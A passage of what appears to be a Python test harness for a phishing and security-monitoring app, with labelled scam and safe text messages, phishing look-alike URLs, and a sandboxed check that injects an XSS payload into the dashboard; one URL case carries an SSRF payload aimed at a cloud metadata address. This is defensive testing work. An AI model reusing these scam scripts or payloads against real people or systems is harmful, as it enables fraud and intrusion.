    {'name': "DM (set 3): Hey dad it's me, I'm using a friend's phone, min", 'label': 'scam', 'mode': 'sms', 'sender': '+1 (917) 555-0123', 'body': "Hey dad it's me, I'm using a friend's phone, mine got stolen. Can you lend me $300 for a train ticket? Please send to this Cash App: $kyle2009"},
    {'name': 'DM (set 3): Hi sorry, I put your number by mistake when sign', 'label': 'scam', 'mode': 'sms', 'sender': '+1 (305) 555-0177', 'body': 'Hi sorry, I put your number by mistake when signing up and a WhatsApp code came to you. Could you share that code with me please?'},
    {'name': 'DM (set 3): Your Facebook page has been flagged for violatin', 'label': 'scam', 'mode': 'sms', 'sender': 'Meta Business Support', 'body': 'Your Facebook page has been flagged for violating trademark policy. To avoid permanent removal, confirm ownership here: https://business-meta-support.com/case/88213'},
    {'name': "DM (set 3): Hi, I'm Emma, a crypto trading coach. My student", 'label': 'scam', 'mode': 'sms', 'sender': '+1 (424) 555-0158', 'body': "Hi, I'm Emma, a crypto trading coach. My students made 40% profit last month. Do you want me to teach you? We can start with only $200"},
    {'name': 'DM (set 3): bro is this you?? 😂 everyone is sharing this htt', 'label': 'scam', 'mode': 'sms', 'sender': 'Jake', 'body': 'bro is this you?? 😂 everyone is sharing this https://bit.ly/4kq9vZ'},
    {'name': "DM (set 3): Congratulations! You've been selected for a remo", 'label': 'scam', 'mode': 'sms', 'sender': '+1 (520) 555-0133', 'body': "Congratulations! You've been selected for a remote job: like YouTube videos and get paid $5 per like, up to $300 daily. Send your full name to start."},
    {'name': 'DM (set 3): Beta I changed my number, this is the new one. Y', 'label': 'safe', 'mode': 'sms', 'sender': 'Mom', 'body': 'Beta I changed my number, this is the new one. Your aunt says hi'},
    {'name': 'DM (set 3): Did you get the verification code for the confer', 'label': 'safe', 'mode': 'sms', 'sender': 'Sana', 'body': "Did you get the verification code for the conference wifi? It's on the badge"},
    {'name': "DM (set 3): I'm a part time tutor now, teaching math on week", 'label': 'safe', 'mode': 'sms', 'sender': 'Ravi', 'body': "I'm a part time tutor now, teaching math on weekends. Want to grab chai later?"},
    {'name': 'DM (set 3): Someone tried to log in to your account from a n', 'label': 'safe', 'mode': 'sms', 'sender': 'Instagram', 'body': 'Someone tried to log in to your account from a new device. If this was you, you can ignore this message.'},
    {'name': 'DM (set 3): Check out this video from our trip! https://yout', 'label': 'safe', 'mode': 'sms', 'sender': 'Bilal', 'body': 'Check out this video from our trip! https://youtu.be/dQw4w9WgXcQ'},
    {'name': 'DM (set 3): Sent you $50 on Zelle for your birthday, buy som', 'label': 'safe', 'mode': 'sms', 'sender': 'Dad', 'body': 'Sent you $50 on Zelle for your birthday, buy something nice'},
    {'name': 'DM (set 3): Your project has been flagged for a plagiarism c', 'label': 'safe', 'mode': 'sms', 'sender': 'Professor Kim', 'body': 'Your project has been flagged for a plagiarism check, which is routine. No action needed.'},
    {'name': 'DM (set 4): Hi, this is Olivia from Indeed HR. We reviewed y', 'label': 'scam', 'mode': 'sms', 'sender': '+1 (702) 555-0164', 'body': 'Hi, this is Olivia from Indeed HR. We reviewed your profile and have a flexible online position: complete 30 simple app-rating tasks a day and receive 150-400 USD daily. Add me on Telegram @olivia_hr_desk'},
    {'name': "DM (set 4): Mum it's me, this is my new number. My bank app ", 'label': 'scam', 'mode': 'sms', 'sender': '+44 7400 123987', 'body': "Mum it's me, this is my new number. My bank app is locked, can you pay a bill for me? It's £720, I'll send the details"},
    {'name': 'DM (set 4): Hello, I am from WhatsApp support team. We detec', 'label': 'scam', 'mode': 'sms', 'sender': '+1 (812) 555-0109', 'body': 'Hello, I am from WhatsApp support team. We detected unusual activity. Please send us the 6-digit verification code we just sent you to keep your account active.'},
    {'name': 'DM (set 4): Congratulations! Your account is eligible for th', 'label': 'scam', 'mode': 'sms', 'sender': 'Instagram Verification Team', 'body': 'Congratulations! Your account is eligible for the blue badge. Apply before your eligibility expires: https://ig-verify-badge.net/apply'},
    {'name': 'DM (set 4): Hey, wrong number? Anyway nice to meet you 😊 I t', 'label': 'scam', 'mode': 'sms', 'sender': 'Sophie', 'body': 'Hey, wrong number? Anyway nice to meet you 😊 I trade gold and crypto with my uncle, made 30% last week. Want me to show you the platform?'},
    {'name': 'DM (set 4): Is this really you in this photo?? https://tinyu', 'label': 'scam', 'mode': 'sms', 'sender': 'Chris', 'body': 'Is this really you in this photo?? https://tinyurl.com/photo-share-22'},
    {'name': 'DM (set 4): Amazon Prime Video is hiring remote reviewers. E', 'label': 'scam', 'mode': 'sms', 'sender': '+1 (213) 555-0177', 'body': 'Amazon Prime Video is hiring remote reviewers. Earn $50 for each review, paid same day. Reply YES to receive the onboarding link.'},
    {'name': 'DM (set 4): Your account will be disabled in 12 hours becaus', 'label': 'scam', 'mode': 'sms', 'sender': 'Facebook Admin', 'body': 'Your account will be disabled in 12 hours because someone reported your posts. If you think this is a mistake, submit an appeal: https://facebook-appeal-review.com'},
    {'name': "DM (set 4): New phone who dis 😂 jk it's Hannah, finally upgr", 'label': 'safe', 'mode': 'sms', 'sender': 'Hannah', 'body': "New phone who dis 😂 jk it's Hannah, finally upgraded. Saturday still on?"},
    {'name': "DM (set 4): Your WhatsApp code is 482-913. Don't share it wi", 'label': 'safe', 'mode': 'sms', 'sender': 'WhatsApp', 'body': "Your WhatsApp code is 482-913. Don't share it with anyone. WhatsApp will never ask for it."},
    {'name': 'DM (set 4): Beta, I sent the money for your books on Easypai', 'label': 'safe', 'mode': 'sms', 'sender': 'Uncle Tariq', 'body': 'Beta, I sent the money for your books on Easypaisa, let me know when it arrives'},
    {'name': 'DM (set 4): The client flagged two issues in the report, can', 'label': 'safe', 'mode': 'sms', 'sender': 'Jamie (work)', 'body': 'The client flagged two issues in the report, can you take a look before 3? Thanks'},
    {'name': 'DM (set 4): Your Instagram account was logged into from Chro', 'label': 'safe', 'mode': 'sms', 'sender': 'Instagram', 'body': 'Your Instagram account was logged into from Chrome on Windows. If this was you, no action is needed.'},
    {'name': "DM (set 4): lol you're in this video from the wedding 😂 http", 'label': 'safe', 'mode': 'sms', 'sender': 'Mia', 'body': "lol you're in this video from the wedding 😂 https://www.instagram.com/reel/C9xyz123/"},
    {'name': "DM (set 4): Team: I've been selected to coach the regional a", 'label': 'safe', 'mode': 'sms', 'sender': 'Coach Dan', 'body': "Team: I've been selected to coach the regional all-stars! Practice schedule coming soon"},
    {'name': "DM (set 4): I'm doing some freelance product reviews for a t", 'label': 'safe', 'mode': 'sms', 'sender': 'Leo', 'body': "I'm doing some freelance product reviews for a tech blog now, pays okay. How's the job hunt going?"},
    {'name': 'DM (set 4): I have some data entry tasks for you on the Q3 s', 'label': 'safe', 'mode': 'sms', 'sender': 'Priya (work)', 'body': 'I have some data entry tasks for you on the Q3 sheet, no rush, by Friday is fine'},
    {'name': "DM (set 4): We'll send you a verification code to confirm th", 'label': 'safe', 'mode': 'sms', 'sender': 'Bank of America', 'body': "We'll send you a verification code to confirm this change. Never share it with anyone."},
    {'name': 'WhatsApp copy-paste: task scam (2-part dates)', 'label': 'scam', 'mode': 'sms', 'sender': '', 'body': '[10/20, 3:41 PM] +1 (213) 555-0187: Hello dear, I am Linda from the recruitment team\n[10/20, 3:41 PM] +1 (213) 555-0187: Remote part time job, earn $300-$800 daily just liking videos\n[10/20, 3:42 PM] Jordan Lee: who is this?\n[10/20, 3:44 PM] +1 (213) 555-0187: Contact our receptionist on Telegram: https://t.me/amz_task_hr', 'expect_category': 'Job / recruitment scam'},
    {'name': "WhatsApp export (Android): 'Hi Mum' new number", 'label': 'scam', 'mode': 'sms', 'sender': '', 'body': "20/10/2026, 15:41 - Messages and calls are end-to-end encrypted. No one outside of this chat can read them.\n20/10/2026, 15:41 - +44 7700 900123: Hi mum, I dropped my phone, this is my new number\n20/10/2026, 15:42 - Jordan: who is this??\n20/10/2026, 15:43 - +44 7700 900123: <Media omitted>\n20/10/2026, 15:44 - +44 7700 900123: Can you transfer £480 to pay a bill urgently? I'll pay you back tomorrow", 'expect_category': 'Family-emergency scam'},
    {'name': 'WhatsApp copy-paste: family chat (safe)', 'label': 'safe', 'mode': 'sms', 'sender': '', 'body': "[10/20, 6:01 PM] Mom: Did you eat beta?\n[10/20, 6:05 PM] Jordan: Yes ammi\n[10/20, 6:06 PM] Mom: Good. Call your aunt tomorrow, it's her birthday"},
    {'name': "WhatsApp: your own scary reply isn't held against them (safe)", 'label': 'safe', 'mode': 'sms', 'sender': '', 'body': '[10/20, 9:00 AM] Sam: Lunch at 1?\n[10/20, 9:02 AM] Jordan Lee: sure. btw I got a text saying my account is suspended and to verify my bank details urgently lol, scammers\n[10/20, 9:03 AM] Sam: haha ignore it'},
    {'name': 'Email: genuine Netflix payment declined', 'label': 'safe', 'mode': 'email', 'sender': 'Netflix <info@account.netflix.com>', 'subject': 'Your payment was declined', 'body': 'Hi Ali, we were unable to process your payment for your Netflix membership. Please update your payment details in your account settings to keep watching.'},
    {'name': 'Text: genuine Spotify subscription expired', 'label': 'safe', 'mode': 'sms', 'sender': 'Spotify', 'body': 'Spotify: Your Premium subscription has expired. Renew in the app to keep listening.'},
    {'name': 'Email: genuine LinkedIn new messages', 'label': 'safe', 'mode': 'email', 'sender': 'LinkedIn <messages-noreply@linkedin.com>', 'subject': 'You have 3 new messages', 'body': 'Hi Ali, you have 3 new messages waiting for you on LinkedIn.'},
    {'name': 'Email: genuine WhatsApp code', 'label': 'safe', 'mode': 'email', 'sender': 'WhatsApp <noreply@whatsapp.com>', 'subject': 'Your WhatsApp code', 'body': "Your WhatsApp code is 123-456. Don't share this code with anyone."},
    {"name": "Lunch plans", "label": "safe", "mode": "sms", "sender": "(703) 555-0111", "body": "Hey! Are we still on for lunch Friday at noon? Let me know."},
    {"name": "Real PayPal receipt", "label": "safe", "mode": "email", "sender": "PayPal <service@paypal.com>",
     "subject": "Your receipt from Coffee Co", "body": "You sent $4.50 USD to Coffee Co. View the details at https://www.paypal.com/activity"},
    {"name": "Bank one-time code", "label": "safe", "mode": "sms", "sender": "72975",
     "body": "Chase: Your one-time code is 448812. Don't share it. We'll never call to ask for it."},
    {"name": "Google verification code", "label": "safe", "mode": "sms", "sender": "22000", "body": "G-551203 is your Google verification code."},
    {"name": "Pharmacy pickup", "label": "safe", "mode": "sms", "sender": "287898",
     "body": "CVS Pharmacy: Your prescription is ready for pickup at 123 Main St. Reply STOP to opt out."},
    {"name": "Amazon shipping notice", "label": "safe", "mode": "email", "sender": "Amazon <shipment-tracking@amazon.com>",
     "subject": "Your package has shipped", "body": "Your order of USB-C cables has shipped. Track it at https://www.amazon.com/gp/your-account/order-details"},
    {"name": "School weather closure", "label": "safe", "mode": "sms", "sender": "68453",
     "body": "Fairfax County Public Schools: All schools are closed today due to weather. Details: https://www.fcps.edu"},
    {"name": "GitHub security notice", "label": "safe", "mode": "email", "sender": "GitHub <noreply@github.com>",
     "subject": "[GitHub] A new SSH key was added to your account",
     "body": "A new SSH key was added. If you did not add this key, remove it immediately at https://github.com/settings/keys"},
    {"name": "Real recruiter follow-up", "label": "safe", "mode": "sms", "sender": "(571) 555-0190",
     "body": "Hi Ali, this is Maria from Deloitte recruiting. Thanks for applying to the Cyber Analyst role. Are you free for a phone screen Thursday at 2pm?"},
]


BROWSER_CASES = [  # (name, url, request type, label) — benign: risk < 30 · notice: 30–54 · malicious: ≥ 30
    ("Google search about wire transfers", "https://www.google.com/search?q=how+to+wire+transfer+money+safely&rlz=1C1GCEA", "main_frame", "benign"),
    ("YouTube video", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", "main_frame", "benign"),
    ("Gmail inbox", "https://mail.google.com/mail/u/0/#inbox", "main_frame", "benign"),
    ("GitHub releases page", "https://github.com/anthropics/anthropic-sdk-python/releases", "main_frame", "benign"),
    ("Amazon product page", "https://www.amazon.com/dp/B0CHX1W1XY?ref=ppx_yo2ov_dt_b_product_details&th=1", "main_frame", "benign"),
    ("Chase dashboard", "https://secure.chase.com/web/auth/dashboard#/dashboard/overview", "main_frame", "benign"),
    ("PayPal sign-in", "https://www.paypal.com/signin?returnUri=%2Fmyaccount%2Fsummary", "main_frame", "benign"),
    ("Microsoft sign-in", "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b&response_type=code&scope=openid%20profile&redirect_uri=https%3A%2F%2Fwww.office.com%2Flanding", "main_frame", "benign"),
    ("Google sign-in", "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&flowName=GlifWebSignIn", "main_frame", "benign"),
    ("News: hospital ransomware attack", "https://www.bleepingcomputer.com/news/security/hospital-chain-hit-by-ransomware-attack/", "main_frame", "benign"),
    ("Blog: how pig-butchering scams work", "https://krebsonsecurity.com/2026/09/how-pig-butchering-scams-work/", "main_frame", "benign"),
    ("CFPB: what is a routing number", "https://www.consumerfinance.gov/ask-cfpb/what-is-a-routing-number-en-1867/", "main_frame", "benign"),
    ("Wikipedia: SQL injection", "https://en.wikipedia.org/wiki/SQL_injection", "main_frame", "benign"),
    ("Stack Overflow: UNION SELECT question", "https://stackoverflow.com/questions/1234567/how-does-union-select-work-in-mysql", "main_frame", "benign"),
    ("IRS refunds page", "https://www.irs.gov/refunds", "main_frame", "benign"),
    ("Google Analytics beacon", "https://www.google-analytics.com/g/collect?v=2&tid=G-ABC123&en=page_view&dl=https%3A%2F%2Fexample.com%2F", "ping", "benign"),
    ("Web font", "https://fonts.gstatic.com/s/ibmplexsans/v19/zYXgKVElMYYaJe8bpLHnCwDKhd.woff2", "font", "benign"),
    ("CDN script", "https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js", "script", "benign"),
    ("Zoom meeting link", "https://us02web.zoom.us/j/1234567890?pwd=QWERTY", "main_frame", "benign"),
    ("Reddit r/Scams thread", "https://www.reddit.com/r/Scams/comments/1abc23/got_a_text_about_an_unpaid_toll/", "main_frame", "benign"),
    ("News: deepfake voice scams", "https://www.nytimes.com/2026/10/01/technology/deepfake-voice-scam-calls.html", "main_frame", "benign"),
    ("Walmart product page", "https://www.walmart.com/ip/Apple-AirPods-Pro-2nd-Generation/1752657021", "main_frame", "benign"),
    ("LinkedIn job post", "https://www.linkedin.com/jobs/view/3891234567/", "main_frame", "benign"),
    ("Bank of America sign-in", "https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go", "main_frame", "benign"),
    ("USPS tracking", "https://tools.usps.com/go/TrackConfirmAction?tLabels=9400111899223197428490", "main_frame", "benign"),
    ("Apple ID", "https://appleid.apple.com/account/manage", "main_frame", "benign"),
    ("Python installer download", "https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe", "main_frame", "notice"),
    ("Look-alike PayPal phishing page", "http://paypa1-secure-login.top/account-suspended/verify-account", "main_frame", "malicious"),
    ("BBB scam payment page", "https://harriscollect.payweb360.com/login?consent=true&logintoken=DD7CC95F", "main_frame", "malicious"),
    ("Scam domain hidden in a redirect", "https://shop.example.com/out?to=https%3A%2F%2Fpayweb360.com%2Fpay", "main_frame", "malicious"),
    ("USPS name on a .top site", "https://usps-redelivery-hold.top/track?id=US9514901185421", "main_frame", "malicious"),
    ("Brand domain used as a subdomain", "https://apple.com.icloud-verify-id.info/login", "main_frame", "malicious"),
    ("Microsoft name on an unofficial site", "https://microsoft-account-security-alert.com/verify", "main_frame", "malicious"),
    ("Punycode look-alike", "http://xn--pypal-4ve.com/signin", "main_frame", "malicious"),
    ("Login page on a raw IP address", "http://203.0.113.9/secure/login.php", "main_frame", "malicious"),
    ("Fake Flash update download", "https://download-update-flashplayer.xyz/setup.exe", "main_frame", "malicious"),
    ("Crypto wallet-drainer airdrop", "https://free-crypto-airdrop.click/connect-wallet?promo=nft-airdrop-claim", "main_frame", "malicious"),
    ("Link carrying an XSS payload", "https://search.example.com/?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", "main_frame", "malicious"),
    ("Link carrying an SSRF payload", "https://www.example-shop.com/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", "main_frame", "malicious"),
]


# ══════════════════════════════════════════════════════════════════════════════
# RUNNER
# ══════════════════════════════════════════════════════════════════════════════
class Bench:
    def __init__(self, target: str, live_ai: bool):
        self.tmp = tempfile.mkdtemp(prefix="pg_sandbox_")
        self.data_path = os.path.join(self.tmp, "training.json")
        self.live_ai = live_ai
        self.guard = EgressGuard(live_ai)
        self.guard.install()
        real = {k: os.environ.get(k, "") for k in ("ANTHROPIC_API_KEY", "GEMINI_API_KEY", "GOOGLE_API_KEY")}
        os.environ["PHISHGUARD_DATA"] = self.data_path              # combined build
        os.environ["PHISHGUARD_DATA_DIR"] = os.path.join(self.tmp, "pg")   # standalone PhishGuard
        os.environ["SOC_DATA_DIR"] = os.path.join(self.tmp, "soc")         # SOC dashboard
        for k in ("SOC_ADMIN_TOKEN", "PHISHGUARD_TOKEN", "PHISHGUARD_URL", "SOC_BROWSER_TOKEN", "PORT"):
            os.environ.pop(k, None)
        if not live_ai:
            os.environ["ANTHROPIC_API_KEY"] = SIM_KEY
            os.environ["GEMINI_API_KEY"] = SIM_KEY
        self.real_keys = real
        name = "sandbox_target_" + re.sub(r"\W", "_", os.path.basename(target))
        spec = importlib.util.spec_from_file_location(name, target)
        self.mod = importlib.util.module_from_spec(spec)
        sys.modules[name] = self.mod
        spec.loader.exec_module(self.mod)
        self.target = os.path.basename(target)
        self.has_pg = hasattr(self.mod, "phishguard_scan")
        self.has_soc = hasattr(self.mod, "analyze_request")
        self.has_browser = hasattr(self.mod, "analyze_browser_url")
        self.has_ioc = self.has_soc and "known_scam_ioc" in getattr(self.mod, "THREAT_INTEL", {})
        if self.has_pg and hasattr(self.mod, "PG_DATA_PATH"):
            self.data_path = self.mod.PG_DATA_PATH
        self.net = FakeInternet(live_ai)
        self.net.install(self.mod)
        self.client = self.mod.app.test_client()
        self.results: list[dict] = []
        self.metrics: dict = {}
        self.ai_keys = {"claude": getattr(self.mod, "ANTHROPIC_API_KEY", ""), "gemini": getattr(self.mod, "GEMINI_API_KEY", "")}

    # ── helpers ──
    def record(self, suite, name, passed, expected, actual, detail=None):
        self.results.append({"target": self.target, "suite": suite, "name": name, "passed": None if passed is None else bool(passed), "expected": expected,
                             "actual": actual, "detail": detail or {}})

    def set_ai(self, claude: bool, gemini: bool):
        if self.has_pg:
            self.mod.ANTHROPIC_API_KEY = self.ai_keys["claude"] if claude else ""
            self.mod.GEMINI_API_KEY = self.ai_keys["gemini"] if gemini else ""

    def reset(self):
        m = self.mod
        if self.has_soc:
            with m._lock:
                m.logs.clear(); m.alerts.clear(); m.rate_windows.clear(); m.BLOCKLIST.clear(); m._alert_seen.clear()
                for k in m._counters:
                    m._counters[k] = 0
        if self.has_browser:
            with m._bdb_lock:
                for t in ("browser_events", "browser_sites", "browser_blocklist", "browser_clients"):
                    m._bdb.execute(f"DELETE FROM {t}")
                m._bdb.commit()
        if self.has_pg:
            with m._lock:
                m.pg_scans.clear()
                for attr in ("_pg_rate", "_rate"):
                    if hasattr(m, attr):
                        getattr(m, attr).clear()
                if hasattr(m, "pg_counters"):
                    m.pg_counters.update({"scanned": 0, "flagged": 0})
            if hasattr(m, "_db"):
                with m._db_lock:
                    m._db.execute("DELETE FROM scans"); m._db.commit()
            if os.path.exists(self.data_path):
                os.remove(self.data_path)
            m.PG_STORE.__init__(self.data_path)
            if hasattr(m, "_ioc_cache"):
                m._ioc_cache["version"] = -1
        self.net.faults.clear()
        self.net.latency = 0.0

    def request(self, case: dict):
        headers = {"User-Agent": case.get("ua", CHROME)}
        if case.get("referrer"):
            headers["Referer"] = case["referrer"]
        kw = {"headers": headers, "environ_base": {"REMOTE_ADDR": case.get("ip", "192.0.2.88")}}
        if "json" in case:
            kw["json"] = case["json"]
        if "form" in case:
            kw["data"], kw["content_type"] = case["form"], "application/x-www-form-urlencoded"
        resp = self.client.open(case["path"], method=case.get("method", "GET"), **kw)
        return resp, self.mod.logs[-1]

    def scan(self, case: dict) -> dict:
        for attr in ("_pg_rate", "_rate"):  # harness sends many scans quickly; the limiter is tested separately
            if hasattr(self.mod, attr):
                getattr(self.mod, attr).clear()
        payload = {k: case.get(k, "") for k in ("mode", "sender", "subject", "body")}
        if case.get("headers"):
            payload["headers"] = case["headers"]
        r = self.client.post("/api/phishguard/scan", json=payload)
        data = r.get_json() or {}
        if r.status_code != 200:
            raise RuntimeError(f"scan API returned {r.status_code}: {data.get('error')}")
        return data

    def feedback(self, scan_id, verdict, ip="127.0.0.1"):
        return self.client.post("/api/phishguard/feedback", json={"scan_id": scan_id, "verdict": verdict},
                                environ_base={"REMOTE_ADDR": ip})

    # ── suites ──
    def suite_network(self, extra=(), only_extra=False, suite="network"):
        self.reset()
        sev_rank = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
        tp = fp = tn = fn = 0
        for case in (list(extra) if only_extra else list(NETWORK_CASES) + list(extra)):
            if case.get("pg_only") and not self.has_ioc:
                continue
            self.mod.rate_windows.clear()  # keep cases independent
            resp, ev = self.request(case)
            flagged = sev_rank[ev["severity"]] >= 2
            ok = flagged if case["label"] == "malicious" else not flagged
            missing = [t for t in case.get("tags", []) if t not in ev["threat_tags"]]
            ok = ok and not missing and (resp.status_code == case.get("status", resp.status_code))
            tp += case["label"] == "malicious" and flagged; fn += case["label"] == "malicious" and not flagged
            fp += case["label"] == "benign" and flagged; tn += case["label"] == "benign" and not flagged
            exp = ("severity ≥ medium" if case["label"] == "malicious" else "severity ≤ low") + \
                  (f"; tags {', '.join(case['tags'])}" if case.get("tags") else "")
            act = f"{ev['severity']} ({ev['risk']}/100)" + (f"; tags {', '.join(ev['threat_tags'])}" if ev["threat_tags"] else "; no tags")
            self.record(suite, case["name"], ok, exp, act, {
                "request": f"{case.get('method', 'GET')} {case['path']}", "user_agent": case.get("ua", "browser"),
                "source": f"{ev['ip']} · {ev.get('city', '')}", "status": resp.status_code,
                "indicators": [f"{h['category']}: {h['keyword']} (in {h['source']})" for h in ev["keyword_hits"]],
                "missing_tags": missing})
        self.metrics[suite] = {"tp": tp, "fp": fp, "tn": tn, "fn": fn}

    def suite_security(self):
        self.reset()
        c, m = self.client, self.mod
        PUB = {"REMOTE_ADDR": "203.0.113.10"}
        if not self.has_soc:
            return self._security_pg_only()
        r = c.post("/api/block", json={"ip": "198.51.100.9"}, environ_base=PUB)
        self.record("security", "Outsider cannot block IPs", r.status_code in (401, 403), "403", str(r.status_code))
        r = c.post("/api/unblock", json={"ip": "198.51.100.9"}, environ_base=PUB)
        self.record("security", "Outsider cannot unblock IPs", r.status_code in (401, 403), "403", str(r.status_code))
        r = c.post("/api/demo", environ_base=PUB)
        self.record("security", "Outsider cannot start demo traffic", r.status_code in (401, 403), "403", str(r.status_code))
        r = c.post("/api/block", json={"ip": "not-an-ip"})
        self.record("security", "Invalid IP rejected", r.status_code == 400, "400", str(r.status_code))
        codes = [self.request({"path": "/log", "ip": "198.51.100.4"})[0].status_code for _ in range(34)]
        self.record("security", "Brute force auto-blocked after 30 requests/min", codes[28] == 200 and codes[30] == 403,
                    "200 until #30, then 403", f"#29={codes[28]}, #31={codes[30]}")
        n = len([a for a in m.alerts if a["ip"] == "198.51.100.4" and "Auto-blocked" in a["reason"]])
        self.record("security", "Exactly one auto-block alert (no spam)", n == 1, "1 alert", f"{n} alerts")
        c.post("/api/unblock", json={"ip": "198.51.100.4"})
        r, _ = self.request({"path": "/log", "ip": "198.51.100.4"})
        self.record("security", "Unblocked IP isn't re-blocked on its next request", r.status_code == 200, "200", str(r.status_code))
        big = c.post("/log", data="x" * (70 * 1024), content_type="text/plain")
        self.record("security", "Oversized request body rejected", big.status_code == 413, "413", str(big.status_code))
        fired, note = self.browser_xss_check()
        self.record("security", "Injected HTML never runs in the dashboard (headless browser)",
                    None if fired is None else fired == 0, "0 payloads executed",
                    note if fired is None else f"{fired} payloads executed", {"how": note})
        try:
            requests.get("https://example.com", timeout=3)
            leaked = True
        except Exception:
            leaked = False
        self.record("security", "Sandbox blocks outbound internet", not leaked, "blocked", "blocked" if not leaked else "LEAKED")
        if self.has_pg:
            r = self.feedback("pg-1", "scam", ip="203.0.113.10")
            self.record("security", "Outsider cannot train PhishGuard", r.status_code in (401, 403), "403", str(r.status_code))
            r = c.post("/api/phishguard/scan", json={"body": "x" * 6000})
            self.record("security", "Oversized message rejected", r.status_code == 413, "413", str(r.status_code))
            codes = [c.post("/api/phishguard/scan", json={"body": "hello"}, environ_base={"REMOTE_ADDR": "192.0.2.201"}).status_code for _ in range(32)]
            self.record("security", "Scan endpoint rate-limited at 30/min", codes.count(429) == 2, "2 × 429", f"{codes.count(429)} × 429")

    def _security_pg_only(self):
        c = self.client
        PUB = {"REMOTE_ADDR": "8.8.8.8"}
        r = c.get("/api/phishguard/scans", environ_base=PUB)
        self.record("security", "Internet visitors can't read your history", r.status_code == 401, "401", str(r.status_code))
        r = c.get("/api/phishguard/scans", environ_base={"REMOTE_ADDR": "192.168.1.20"})
        self.record("security", "Your phone on home Wi-Fi can", r.status_code == 200, "200", str(r.status_code))
        r = self.feedback("pg-1", "scam", ip="8.8.8.8")
        self.record("security", "Outsider cannot train PhishGuard", r.status_code in (401, 403), "401", str(r.status_code))
        r = c.post("/api/phishguard/scan", json={"body": "x" * 6000})
        self.record("security", "Oversized message rejected", r.status_code == 413, "413", str(r.status_code))
        codes = [c.post("/api/phishguard/scan", json={"body": "hello"}, environ_base={"REMOTE_ADDR": "192.168.1.21"}).status_code for _ in range(32)]
        self.record("security", "Check endpoint rate-limited at 30/min", codes.count(429) == 2, "2 × 429", f"{codes.count(429)} × 429")
        fired, note = self.browser_xss_check()
        self.record("security", "Injected HTML never runs in the app (headless browser)",
                    None if fired is None else fired == 0, "0 payloads executed",
                    note if fired is None else f"{fired} payloads executed", {"how": note})
        try:
            requests.get("https://example.com", timeout=3)
            leaked = True
        except Exception:
            leaked = False
        self.record("security", "Sandbox blocks outbound internet", not leaked, "blocked", "blocked" if not leaked else "LEAKED")

    def browser_xss_check(self):
        """Seed attacker-controlled text everywhere it can appear, render the real dashboard, see if any runs."""
        try:
            from playwright.sync_api import sync_playwright
        except ImportError:
            return None, "skipped: pip install playwright && playwright install chromium"
        from urllib.parse import quote
        from werkzeug.serving import make_server
        payload = '<img src=x onerror="window.__xss=(window.__xss||0)+1">'
        if self.has_soc:
            self.request({"path": "/wp-admin?x=" + quote(payload), "ip": "198.51.100.71", "ua": payload,
                          "referrer": "https://evil.example/" + quote(payload)})
            self.client.post("/api/block", json={"ip": "198.51.100.72", "reason": payload})
        if self.has_browser:
            self.client.post("/api/browser/events", headers={"X-SOC-Browser-Token": self.mod.BROWSER_TOKEN}, json={
                "client": {"id": "x", "name": payload}, "events": [{"url": "https://paypa1-login.top/verify-account?x=" + quote(payload), "type": "main_frame"}]})
            self.client.post("/api/browser/block", json={"site": "evil-site.top", "reason": payload})
        if self.has_pg:
            self.scan({"mode": "sms", "sender": payload, "body": payload + " verify now https://x-verify.top/login"})
        import logging
        logging.getLogger("werkzeug").setLevel(logging.ERROR)
        srv = make_server("127.0.0.1", 0, self.mod.app, threaded=True)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        surfaces = ["event log", "alerts", "blocklist", "top sources", "event drawer"]
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch()
                page = browser.new_page()
                page.goto(f"http://127.0.0.1:{srv.server_port}/")
                page.wait_for_timeout(3500 if self.has_soc else 1200)
                if page.locator("tr[data-id]").count():
                    page.locator("tr[data-id]").first.click(); page.wait_for_timeout(500); page.keyboard.press("Escape")
                if self.has_browser:
                    page.click("#tab-browser"); page.wait_for_timeout(1500)
                    if page.locator("[data-bwev]").count():
                        page.locator("[data-bwev]").first.click(); page.wait_for_timeout(500); page.keyboard.press("Escape")
                    surfaces += ["browser view", "browser blocklist", "browser event drawer"]
                if self.has_pg and not self.has_soc:
                    surfaces = ["history", "scan result", "training"]
                    page.click("[data-view=history]"); page.wait_for_timeout(600)
                    if page.locator("[data-scan]").count():
                        page.locator("[data-scan]").first.click(); page.wait_for_timeout(800)
                    # the Training tab is developer-only: switch developer mode on (allowed from this computer), then open it
                    page.evaluate("fetch('/api/dev/login', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: '{}'})")
                    page.wait_for_timeout(300)
                    page.goto(f"http://127.0.0.1:{srv.server_port}/#developer"); page.wait_for_timeout(1500)
                elif self.has_pg:
                    page.click("#tab-messages"); page.wait_for_timeout(1200)
                    if page.locator(".scan-row").count():
                        page.locator(".scan-row").first.click(); page.wait_for_timeout(800)
                    surfaces += ["recent scans", "scan result"]
                fired = page.evaluate("window.__xss || 0")
                browser.close()
        except Exception as exc:
            return None, f"skipped: browser unavailable ({str(exc).splitlines()[0][:120]})"
        finally:
            srv.shutdown()
        return fired, "checked " + ", ".join(surfaces)

    def message_cases(self, extra=()):
        builtin = {"harris-optin": "scam", "harris-pay": "scam", "bergen": "scam", "sandpiper": "scam",
                   "maple": "spam", "paypal": "scam", "dentist": "safe", "trailhead": "scam",
                   "link-paypal": "scam", "qr-upi": "scam", "es-otp": "scam", "ur-bisp": "scam", "hi-kyc": "scam", "roman-urdu-call": "scam"}
        cases = [{"name": f"{e['title']} (built-in example)", "label": builtin.get(e["key"], "safe"), **e}
                 for e in self.mod.PG_EXAMPLES]
        return cases + list(MESSAGE_CASES) + list(extra)

    def suite_messages(self, extra=(), only_extra=False, suite="messages"):
        self.reset()
        self.set_ai(self.live_ai, self.live_ai)  # rules engine only unless real AI is in use
        stats = {"tp": 0, "fp": 0, "tn": 0, "fn": 0}
        for case in (list(extra) if only_extra else self.message_cases(extra)):
            r = self.scan(case)
            positive = case["label"] in ("scam", "spam")
            # a link or QR code gets the "Don't open" warning from 30 up, so that is the bar for links
